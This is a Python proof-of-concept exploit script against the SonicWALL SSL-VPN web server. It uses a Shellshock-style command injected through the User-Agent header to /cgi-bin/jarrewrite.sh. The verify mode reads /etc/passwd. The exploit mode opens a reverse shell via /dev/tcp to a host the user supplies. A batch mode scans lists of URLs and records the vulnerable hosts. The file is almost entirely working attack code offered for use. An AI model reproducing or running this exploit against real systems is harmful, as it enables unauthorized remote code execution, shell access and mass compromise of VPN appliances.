#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
"""
@File    :   POC.py
@Time    :   2021/01/26 20:21:57
@Author  :   _0xf4n9x_
@Version :   1.0
@Contact :   fanq.xu@gmail.com
@Desc    :   SonicWALL SSL-VPN Web Server Vulnerable Exploit
"""


import os
import sys
import argparse
import requests
from requests import exceptions
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def title():
    print("Eg: \n    python3 POC.py -u htttp://127.0.0.1")
    print("    python3 POC.py -e htttp://127.0.0.1 -rh 1.1.1.1 -rp 9999")
    print("    python3 POC.py -f urls.txt")


def verify(url):
    """
    对单个URL进行漏洞验证
    """
    url = 'https://' + url.replace('https://', '').replace('/', '')
    reqUrl = url + '/cgi-bin/jarrewrite.sh'
    header = {'User-Agent': '() { :; }; echo ; /bin/bash -c "cat /etc/passwd"'}
    try:
        r = requests.get(reqUrl, headers=header, verify=False, timeout=10)
        if r.status_code == 200 and 'root:' in r.text:
            print(url + " is vulnerable! :)")
            return 1
        else:
            print(url + " is not vulnerable! :(")
    except exceptions.HTTPError as e:
        print(str(e.message))
    except:
        print(url + " is not vulnerable :(")
    return 0


def batch_verify(file):
    """
    对一个文件中的多个URL进行漏洞验证
    """
    if os.path.isfile(file) == True:
        urls = []
        with open(file) as target:
            urls = target.read().splitlines()
            for url in urls:
                if verify(url) == 1:
                    with open("success.txt", "a+") as f:
                        f.write(url + "\n")
                    f.close()


def exploit(url, host, port):
    """
    反弹Shell
    """
    reverse = "nohup bash -i >& /dev/tcp/%s/%s 0>&1 &" % (host, port)
    url = 'https://' + url.replace('https://', '').replace('/', '')
    reqUrl = url + '/cgi-bin/jarrewrite.sh'
    header = {"User-Agent": '() { :; }; echo ; /bin/bash -c "%s"' % (reverse)}
    try:
        r = requests.get(reqUrl, headers=header, verify=False, timeout=10)
        if '/usr/src/EasyAccess/www/cgi-bin/jarrewrite.sh' in r.text:
            print('Reverse Shell Successed! :)')
        else:
            print('Reverse Shell Failed! :(')
    except exceptions.HTTPError as e:
        print(str(e.message))
    except:
        print(url + " is not vulnerable :(")
    return 0


def main():
    parser = argparse.ArgumentParser(
        description="SonicWALL SSL-VPN Web Server Vulnerable Exploit")
    parser.add_argument('-u', '--url', type=str,
                        help="vulnerability verification for individual websites")
    parser.add_argument('-e', '--exploit', type=str,
                        help="reverse shell to your VPS host")
    parser.add_argument('-rh', type=str,
                        help="remote VPS IP")
    parser.add_argument('-rp', type=str,
                        help="remote VPS port")
    parser.add_argument('-f', '--file', type=str,
                        help="perform vulnerability checks on multiple websites in a file, and the vulnerable websites will be output to the success.txt file")
    args = parser.parse_args()

    if len(sys.argv) <= 1:
        parser.print_help()
        title()
    elif sys.argv[1] in ['-u','--url']:
        verify(args.url)
    elif sys.argv[1] in ['-f', '--file']:
        batch_verify(args.file)
    elif set([sys.argv[1], sys.argv[3], sys.argv[5]]) < set(['-e', '--exploit', '-rh', '-rp']):
        exploit(args.exploit, args.rh, args.rp)
    else:
        parser.print_help()
        title()


if __name__ == "__main__":
    main()

